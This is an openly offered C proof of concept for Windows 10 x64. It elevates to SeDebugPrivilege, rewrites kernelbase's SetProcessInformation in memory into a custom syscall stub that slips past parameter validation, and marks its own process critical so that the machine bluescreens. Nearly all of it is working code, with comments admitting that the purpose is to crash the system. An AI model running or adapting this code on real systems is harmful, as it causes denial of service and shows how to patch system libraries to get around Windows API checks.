/// Winver: Win10 x64 22H2 19045.2728
/// KernelBase.dll ver: 10.0.19041.2728
/// 
/// puts `ProcessBreakOnTermination` flag on current process,
/// i.e. marks the process as CRITICAL. 
/// On process termination, a BSOD is triggered,
/// with stopcode `CRITICAL_PROCESS_DIED`.
/// 
/// EDRs should have no issue catching and preventing this,
/// so go take it for a spin.
/// it should go without saying to use a VM tho.

/// the call to `SetProcessInformation` may look iffy
/// on the syscall stub in kernelbase, instead of calling
/// the function as usual.
/// you can find the explanation down below.
/// the reason i'm double mentioning this,
/// is that since we're skipping over
/// all the goodies the `SetProcessInformation` func preps
/// before calling the NTCALL, we're 99.99% likely gonna segfault
/// after returning to kernelbase, which means we're gonna BSOD immediately

#include <stdio.h>
#include <Windows.h>

#define SE_DEBUG_PRIVILEGE  (20)

#define NTCALL_OFFSET       0xDB
#define RIP_DS_OFFSET       0x03

#define PAD_SIZE            0x25

#define CALL_SIZE           0x07

const BYTE MOV_STUB[] = {
    0x4C, 0x8B, 0xD1,               // mov r10, rcx
    0xB8, 0x1c, 0x00, 0x00, 0x00    // mov eax, 0x1c
};

BYTE PAD_BYTES[PAD_SIZE] = { 0 };

BOOL AdjustPrivileges(void) {
    // RtlAdjustPrivilege
    
    typedef NTSTATUS (NTAPI *pRtlAdjustPrivilege)(
        ULONG, BOOLEAN, BOOLEAN, PBOOLEAN
    );

    HANDLE hNtDll = GetModuleHandleA("ntdll.dll");
    if (NULL == hNtDll) {
        fprintf(
            stderr,
            "[-] GetModuleHandle() - %02lx\n",
            GetLastError()
        );
        return FALSE;
    }

    pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege) GetProcAddress(
        hNtDll,
        "RtlAdjustPrivilege"
    );

    if (NULL == RtlAdjustPrivilege) {
        fprintf(
            stderr,
            "[-] GetProcAddress() - %02lx\n",
            GetLastError()
        );
        return FALSE;
    }

    BOOLEAN bGarbage;
    NTSTATUS status = RtlAdjustPrivilege(
        SE_DEBUG_PRIVILEGE,
        TRUE,
        FALSE,
        &bGarbage
    );

    if (EXIT_SUCCESS != status) {
        fprintf(
            stderr,
            "[-] RtlAdjustPriv() - %02lx\n",
            status
        );
        return FALSE;
    }

    return TRUE;
}

int main(void) {
    if (!AdjustPrivileges()) {
        return EXIT_FAILURE;
    }

    HMODULE hKernelBase = GetModuleHandleA("KernelBase.dll");
    if (hKernelBase == NULL) {
        printf("[-] GetModuleHandleA() failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    PUINT_PTR pSetProcessInformation = (PUINT_PTR) GetProcAddress(hKernelBase, "SetProcessInformation");
    if (pSetProcessInformation == NULL) {
        printf("[-] GetProcAddress() failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    printf("[+] KERNELBASE.DLL!SetProcessInformation: 0x%p\n", pSetProcessInformation);

    DWORD oldProt;
    if (!VirtualProtect(pSetProcessInformation, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
        printf("[-] VirtualProtect() failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }
    
    printf("[*] Patching call to 'NtSetInformationProcess'..\n");
    PBYTE pCallInst = (PBYTE) ((UINT_PTR) pSetProcessInformation + NTCALL_OFFSET);
    printf("[+] Call Address: 0x%p\n", pCallInst);
    DWORD ripOffset = (*(PDWORD) ((UINT_PTR) pCallInst + RIP_DS_OFFSET)) + CALL_SIZE;
    printf("[+] RIP Offset: 0x%08X\n", ripOffset);

    if (!VirtualProtect(pCallInst + ripOffset + CALL_SIZE, 1, PAGE_READWRITE, &oldProt)) {
        printf("[-] VirtualProtect() failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    UINT_PTR ripValue = (UINT_PTR) ((UINT_PTR) pSetProcessInformation + NTCALL_OFFSET);
    memcpy(PAD_BYTES, pCallInst, sizeof(PAD_BYTES));

    printf("[+] Patched call address: 0x%08llx\n", (UINT_PTR) pCallInst + sizeof(MOV_STUB));
    memcpy(pCallInst + sizeof(MOV_STUB), &PAD_BYTES[1], sizeof(PAD_BYTES) - 1);

    memcpy(pCallInst, MOV_STUB, sizeof(MOV_STUB));

    // 0x6 is the size of the patched call instruction
    ripOffset -= sizeof(MOV_STUB) + (CALL_SIZE - 1);
    printf("[+] New RIP Offset: 0x%08X\n", ripOffset);

    *((PDWORD) ((UINT_PTR) pCallInst + sizeof(MOV_STUB) + 2)) = ripOffset;

    printf("[+] Successfully patched 'call ds:[&NtSetInformationProcess]' at 0x%p\n", pCallInst);

    PBYTE pCallInstPtr = (PBYTE) ((UINT_PTR) pCallInst + sizeof(MOV_STUB) + 0x6 + ripOffset);
    printf("[*] Patching pointer to 'NtSetInformationProcess' at 0x%p..\n", pCallInstPtr);

    UINT_PTR ptrVal = *(PUINT_PTR) pCallInstPtr;
    ptrVal += 18;
    *((PUINT_PTR) ((UINT_PTR) pCallInstPtr)) = ptrVal;

    printf("[+] Successfully patched pointer to 'NtSetInformationProcess' at 0x%p\n", pCallInstPtr);
    printf("[+] New pointer value: 0x%08llX\n", ptrVal);

    printf("\n[*] Press ENTER to call SetProcessInformation()..\n");
    char c = getchar();

    BOOL bBreakOnTermination = TRUE;
    
    typedef enum _PROCESSINFOCLASS {
        ProcessBreakOnTermination = 29
    } PROCESSINFOCLASS;

    /// we're gonna jump straight on top of the fugazi syscall stub
    /// that we wrote to kernelbase!SetProcessInformation at `pCallInst`,
    /// because `ProcessBreakOnTermination` would be rejected otherwise
    /// and the function would return `ERROR_INVALID_PARAMETER`.
    /// if this is too obvious, another option is to patch
    /// the conditional jumps that test `edx` (ProcessInformationClass),
    /// which would most probably also solve the insta-BSOD
    /// after executing a couple instructions after returning to kernelbase,
    /// but i don't wanna bother with that, since the purpose is to crash anyways.
    typedef BOOL (WINAPI *pSetProcessInformation_t)(
        IN HANDLE                       hProcess,
        IN PROCESS_INFORMATION_CLASS    ProcessInformationClass,
        LPVOID                          ProcessInformation,
        IN DWORD                        ProcessInformationSize
    );

    if (!((pSetProcessInformation_t) pCallInst)(
            GetCurrentProcess(),
            ProcessBreakOnTermination,
            &bBreakOnTermination,
            sizeof(bBreakOnTermination)
    )) {
        printf("[-] SetProcessInformation() failed: %lu\n", GetLastError());
        return EXIT_FAILURE;
    }

    /// if it pulls through, you're gonna crash anyway,
    /// so anything below the call is pointless

    printf("[+] SetProcessInformation() success\n");

    while (1);

    return EXIT_SUCCESS;
}
